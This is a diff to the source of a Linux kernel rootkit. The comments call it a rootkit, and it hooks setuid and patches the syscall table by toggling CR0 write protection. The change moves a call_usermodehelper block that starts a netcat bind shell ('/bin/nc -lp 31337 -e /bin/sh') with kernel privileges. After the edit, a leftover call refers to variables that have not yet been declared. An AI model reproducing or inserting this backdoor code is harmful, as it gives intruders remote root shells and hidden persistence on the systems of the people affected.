@@ -202,12 +202,6 @@ asmlinkage int hacked_setuid(uid_t uid){
 int rootkit_init(void) { // Start lel rootkit
 	printk("Rootkit Initialized\n");
 
-	char *argv[] = { "/bin/nc", "-lp", "31337", "-e", "/bin/sh", NULL };
-	static char *env[] = {
-	"HOME=/",
-	"TERM=linux",
-	"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-	
 	call_usermodehelper(argv[0], argv, env, UMH_NO_WAIT);
 
 	//list_del_init(&__this_module.list); // Remove module from /proc/modules
@@ -232,6 +226,14 @@ int rootkit_init(void) { // Start lel rootkit
 	#endif
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
+
+	char *argv[] = { "/bin/nc", "-lp", "31337", "-e", "/bin/sh", NULL };
+        static char *env[] = {
+        "HOME=/",
+        "TERM=linux",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+
+        call_usermodehelper(argv[0], argv, env, UMH_NO_WAIT);
 	
 	return 0;
 }
